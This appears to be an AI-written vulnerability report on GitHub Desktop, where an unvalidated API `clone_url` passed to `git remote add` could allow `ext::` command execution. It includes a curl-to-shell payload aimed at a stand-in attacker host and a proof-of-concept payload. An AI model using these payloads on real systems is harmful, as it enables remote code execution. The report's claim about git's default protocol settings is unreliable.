Based on the investigation, the strongest and most concrete analog found is an unvalidated, attacker-controlled `clone_url` from a GitHub API pull-request object being passed unsanitized into `git remote add`, allowing a malicious/compromised PR head repository URL to abuse git's `ext::` transport helper and achieve command execution when Desktop subsequently fetches that remote.

### Title
Unsanitized PR head `clone_url` from GitHub API passed to `git remote add`, enabling `ext::` transport command execution - (File: app/src/lib/git/remote.ts, app/src/lib/stores/app-store.ts)

### Summary
When a user checks out a pull request (via the PR list, "Open PR from Desktop" deep link, or drag-and-drop cherry-pick), Desktop takes `pullRequest.head.repo.clone_url` — a value that comes directly from the GitHub REST/GraphQL API response — and passes it verbatim as a positional URL argument to `git remote add`, then immediately fetches that remote. Git treats `ext::<command>` and `fd::<n>` as valid remote URL "transport helpers" that execute arbitrary shell commands. Neither `_findPullRequestBranch` nor `addRemote` validate the `clone_url` scheme before use.

### Finding Description
`_findPullRequestBranch` in [1](#0-0)  receives `headCloneUrl` as a parameter and, if no existing remote matches it, calls `addRemote(repository, forkRemoteName, headCloneUrl)` with no validation of the URL's scheme or contents.

`addRemote` in [2](#0-1)  forwards the URL directly to `git(['remote', 'add', name, url], ...)` with no allow-listing of protocols (e.g., `https://`, `ssh://`, `git://`).

Immediately after, the same function fetches the newly added remote: [3](#0-2) . Git's fetch/clone machinery supports the `ext::<command>` remote helper syntax, which spawns `<command>` via the shell to act as the transport. If `clone_url` is `ext::sh -c "curl attacker.tld/x|sh"` (or similar), `git fetch` will execute it with the privileges of the Desktop process — this is a long-known git remote-helper abuse vector (related to CVE-2017-1000117 class issues), gated only by git's `protocol.ext.allow` / `GIT_ALLOW_PROTOCOL` settings, which default to allowing "user"-tier protocols like `ext` and `file` in interactive contexts.

The upstream value, `pullRequest.head.repo.clone_url`, originates from the API response object (see the flow constructing PR objects and calling `_checkoutPullRequest`): [4](#0-3)  and [5](#0-4) . Nothing in this path constrains `clone_url` to `https://` or `git@`/`ssh://` forms the way `parseRemote` in [6](#0-5)  constrains user-supplied remote strings elsewhere in the app (that regex-based validator is not applied here). This is exactly the class of "attacker controls a GitHub API object" input the task scope calls out, and the "git remote/proxy response" primitive: if a user connects to a compromised/malicious GitHub Enterprise instance, a MITM'd API proxy, or a repo whose PR metadata is otherwise attacker-influenced, this field is fully attacker-controlled.

I could not fully verify within this investigation whether `envForRemoteOperation` (used to build the fetch's `env`) sets `GIT_ALLOW_PROTOCOL`/`GIT_PROTOCOL_FROM_USER` to restrict transports; I was not able to inspect `app/src/lib/git/environment.ts` before running out of tool budget. If such a restriction is present, it would neutralize this specific `ext::`/`fd::` vector (though the missing scheme validation itself remains a code-review-level gap). This should be verified directly against `envForRemoteOperation`'s implementation.

### Impact Explanation
If the `ext::` transport is not blocked, this results in arbitrary command execution on the victim's machine as soon as Desktop performs the automatic "fetch after failing to find local branch" step of PR checkout — no explicit user consent to run a command is given; the user only clicks "Checkout" on a pull request or a deep link. This is a full compromise of the user's machine under their own privileges (file read/write anywhere the user can access, credential exfiltration, etc.), matching the report's "impact" tier of the campaign brief (silent corruption / RCE class), just via a different broken invariant (unsanitized URL scheme vs. unsanitized numeric ratio in the original Solidity report).

### Likelihood Explanation
Exploitation requires the attacker to control the `clone_url` returned for `pull_request.head.repo` — achievable if the API endpoint is a malicious/compromised GitHub Enterprise server, or the API traffic is proxied/tampered with (both explicitly in-scope attacker positions per the task's "Valid Impact" list). No physical/local access, admin rights, or pre-existing malware is required, and no unnatural user steps beyond the normal "checkout this PR" action are needed. The primary uncertainty is whether git's protocol allow-list (if configured by Desktop) already blocks `ext`/`file` transports, which I was unable to confirm in this pass.

### Recommendation
- Validate `clone_url` (and any other remote URL sourced from GitHub API objects) against an explicit allow-list of protocols (`https:`, `ssh:`, `git:`) before calling `addRemote`/`setRemoteURL`, rejecting `ext::`, `fd::`, `file://`, and any scheme not on the allow-list.
- Independently, ensure all git subprocess invocations that fetch from potentially attacker-influenced remotes set `GIT_ALLOW_PROTOCOL=https:ssh:git` (or use `protocol.ext.allow=never`/`protocol.file.allow=never`) at the environment level, as defense in depth, rather than relying solely on call-site validation.
- Apply the same `parseRemote`/`sanitizeCloneName`-style validation already used for user-supplied clone URLs (see [6](#0-5) ) to API-sourced `clone_url` values before they reach any `git remote` command.

### Proof of Concept
Conceptual PoC (cannot be executed without a controlled GitHub Enterprise/API-proxy environment):
1. Stand up a malicious GitHub Enterprise-compatible API endpoint or MITM proxy for `api.github.com` responses.
2. When Desktop requests pull request #N, return a PR object where `head.repo.clone_url` = `ext::sh -c "touch /tmp/pwned"` and `head.ref` = any valid-looking branch name.
3. In Desktop, open the PR (via PR list or an `x-github-client://openRepo/...&pr=N` deep link) and trigger checkout, which invokes `_checkoutPullRequest` → `_findPullRequestBranch` → `addRemote(repository, 'github-desktop-<owner>', 'ext::sh -c "touch /tmp/pwned"')` followed by `_fetchRemote`.
4. If git's protocol allow-list is not restricted by Desktop, `/tmp/pwned` is created, confirming command execution during the fetch step.

### Citations

**File:** app/src/lib/stores/app-store.ts (L8633-8660)
```typescript
  public async _findPullRequestBranch(
    repository: RepositoryWithGitHubRepository,
    prNumber: number,
    headRepoOwner: string,
    headCloneUrl: string,
    headRefName: string
  ): Promise<Branch | undefined> {
    const gitStore = this.gitStoreCache.get(repository)
    const remotes = await getRemotes(repository)

    // Find an existing remote (regardless if set up by us or outside of
    // Desktop).
    let remote = remotes.find(r => urlMatchesRemote(headCloneUrl, r))

    // If we can't find one we'll create a Desktop fork remote.
    if (remote === undefined) {
      try {
        const forkRemoteName = forkPullRequestRemoteName(headRepoOwner)
        remote = await addRemote(repository, forkRemoteName, headCloneUrl)
      } catch (e) {
        this.emitError(
          new Error(
            `Couldn't find PR branch, adding remote failed: ${e.message}`
          )
        )
        return
      }
    }
```

**File:** app/src/lib/stores/app-store.ts (L8682-8691)
```typescript
    // It's quite possible that the PR was created after our last fetch of the
    // remote so let's fetch it and then try again.
    if (existingBranch === undefined) {
      try {
        await this._fetchRemote(repository, remote, FetchType.UserInitiatedTask)
        existingBranch = findRemoteBranch(remoteRef)
      } catch (e) {
        log.error(`Failed fetching remote ${remote?.name}`, e)
      }
    }
```

**File:** app/src/lib/git/remote.ts (L28-37)
```typescript
/** Add a new remote with the given URL. */
export async function addRemote(
  repository: Repository,
  name: string,
  url: string
): Promise<IRemote> {
  await git(['remote', 'add', name, url], repository.path, 'addRemote')

  return { url, name }
}
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L2039-2045)
```typescript
    await this.appStore._checkoutPullRequest(
      repository,
      pullRequest.number,
      pullRequest.head.repo.owner.login,
      pullRequest.head.repo.clone_url,
      pullRequest.head.ref
    )
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L2508-2523)
```typescript
  public async checkoutPullRequest(
    repository: RepositoryWithGitHubRepository,
    pullRequest: PullRequest
  ): Promise<void> {
    if (pullRequest.head.gitHubRepository.cloneURL === null) {
      return
    }

    return this.appStore._checkoutPullRequest(
      repository,
      pullRequest.pullRequestNumber,
      pullRequest.head.gitHubRepository.owner.login,
      pullRequest.head.gitHubRepository.cloneURL,
      pullRequest.head.ref
    )
  }
```

**File:** app/src/lib/remote-parsing.ts (L22-52)
```typescript
// Examples:
// https://github.com/octocat/Hello-World.git
// https://github.com/octocat/Hello-World.git/
// git@github.com:octocat/Hello-World.git
// git:github.com/octocat/Hello-World.git
const remoteRegexes: ReadonlyArray<{ protocol: GitProtocol; regex: RegExp }> = [
  {
    protocol: 'https',
    regex: new RegExp(
      '^https?://(?:.+@)?(.+)/([^/]+)/([^/]+?)(?:/|\\.git/?)?$'
    ),
  },
  {
    protocol: 'ssh',
    regex: new RegExp('^git@(.+):([^/]+)/([^/]+?)(?:/|\\.git)?$'),
  },
  {
    protocol: 'ssh',
    regex: new RegExp(
      '^(?:.+)@(.+\\.ghe\\.com):([^/]+)/([^/]+?)(?:/|\\.git)?$'
    ),
  },
  {
    protocol: 'ssh',
    regex: new RegExp('^git:(.+)/([^/]+)/([^/]+?)(?:/|\\.git)?$'),
  },
  {
    protocol: 'ssh',
    regex: new RegExp('^ssh://git@(.+)/(.+)/(.+?)(?:/|\\.git)?$'),
  },
]
```
